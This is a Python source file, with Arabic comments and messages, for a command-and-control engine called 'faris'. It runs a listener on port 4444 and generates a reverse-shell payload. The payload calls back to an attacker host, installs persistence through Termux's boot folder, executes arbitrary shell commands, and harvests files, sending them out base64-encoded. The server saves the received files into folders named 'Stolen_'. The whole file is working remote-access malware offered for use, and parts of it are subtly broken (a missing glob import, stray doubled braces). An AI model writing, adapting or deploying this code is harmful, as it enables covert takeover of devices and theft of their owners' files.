import socket, threading, os, base64
from datetime import datetime
from .base import BaseEngine

class C2Engine(BaseEngine):
    name = "faris"
    def __init__(self):
        self.active_clients = {}
        self.server_socket = None
        self.running = False
        self.port = 4444

    def status(self):
        return {"running": self.running, "port": self.port, "clients": len(self.active_clients)}

    def start_server(self, port=4444):
        if self.running: return {"success": True, "message": "الخادم يعمل بالفعل"}
        self.port = int(port)
        self.running = True
        def listen():
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(("0.0.0.0", self.port))
                self.server_socket.listen(5)
                while self.running:
                    self.server_socket.settimeout(1.0)
                    try:
                        client, addr = self.server_socket.accept()
                        self.active_clients[str(addr[0])] = client
                    except socket.timeout: continue
            except: self.running = False
        threading.Thread(target=listen, daemon=True).start()
        return {"success": True, "message": f"✅ يعمل على المنفذ {port}"}

    def stop_server(self):
        self.running = False
        if self.server_socket: self.server_socket.close()
        self.active_clients = {}
        return {"success": True, "message": "✅ تم إيقاف الخادم"}

    def generate_payload(self, lhost, lport):
        if not lhost: lhost = "127.0.0.1"
        # البايلود المحدث مع خيار الاستمرارية
        code = f"""import socket, subprocess, base64, os, sys

# ميزة الاستمرارية: نسخ البايلود إلى مجلد بدء التشغيل
if len(sys.argv) > 1 and sys.argv[1] == '--persist':
    try:
        home = os.path.expanduser('~')
        boot_dir = os.path.join(home, '.termux', 'boot')
        os.makedirs(boot_dir, exist_ok=True)
        # نسخ الكود إلى مجلد بدء التشغيل
        script_path = os.path.join(boot_dir, 'faris.py')
        with open(__file__, 'r') as f: src = f.read()
        with open(script_path, 'w') as f: f.write(src)
        print("✅ Persistence installed successfully")
        sys.exit(0)
    except Exception as e:
        print("❌ Persistence failed:", e)
        sys.exit(1)

# دالة الاتصال
def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    return s

while True:
    try:
        s = connect_back()
        while True:
            cmd = s.recv(4096).decode()
            if cmd.lower() == 'exit': break
            try:
                if cmd.startswith('harvest '):
                    folder = cmd.split(' ', 1)[1]
                    files = glob.glob(os.path.join(folder, '*.*'))[:10]
                    for filepath in files:
                        if os.path.exists(filepath):
                            with open(filepath, 'rb') as f:
                                data = base64.b64encode(f.read()).decode()
                            ext = os.path.splitext(filepath)[1]
                            s.send(f"FILE_START:{{ext}}:{{data}}:FILE_END".encode())
                            s.recv(1024)
                    s.send(b"HARVEST_DONE")
                elif cmd.startswith('download '):
                    path = cmd.split(' ', 1)[1]
                    if os.path.exists(path):
                        with open(path, 'rb') as f:
                            data = base64.b64encode(f.read()).decode()
                        ext = os.path.splitext(path)[1]
                        s.send(f"FILE_START:{{ext}}:{{data}}:FILE_END".encode())
                    else: s.send(b"FILE_NOT_FOUND")
                else:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(out)
            except Exception as e:
                s.send(str(e).encode())
    except:
        # إذا فشل الاتصال، انتظر دقيقة وحاول مجدداً (لضمان البقاء)
        import time; time.sleep(60)
"""
        return {"success": True, "code": code}

    def send_command(self, cmd):
        if not self.active_clients:
            return {"success": False, "message": "لا يوجد أجهزة متصلة"}
        try:
            client = list(self.active_clients.values())[0]
            client.send(cmd.encode())
            
            files_received = 0
            output_msgs = []
            
            folder_name = f"Stolen_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"
            save_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", folder_name)
            os.makedirs(save_dir, exist_ok=True)
            
            while True:
                res = client.recv(1024 * 1024).decode(errors="ignore")
                if not res: break
                if res.startswith("FILE_START:"):
                    parts = res.split(":")
                    ext = parts[1]
                    b64_data = parts[2]
                    file_name = f"file_{files_received + 1}{ext}"
                    save_path = os.path.join(save_dir, file_name)
                    with open(save_path, "wb") as f:
                        f.write(base64.b64decode(b64_data))
                    files_received += 1
                    output_msgs.append(f"✅ {{file_name}}")
                    client.send(b"OK")
                elif res == "HARVEST_DONE":
                    break
                elif res == "FILE_NOT_FOUND":
                    output_msgs.append("❌ الملف غير موجود")
                    break
                else:
                    output_msgs.append(res)
                    break
            
            if files_received > 0:
                output_msgs.append(f"\n📁 تم حفظ الملفات في:\n{{save_dir}}")
            
            return {"success": True, "output": "\n".join(output_msgs)}
        except Exception as e:
            return {"success": False, "message": str(e)}
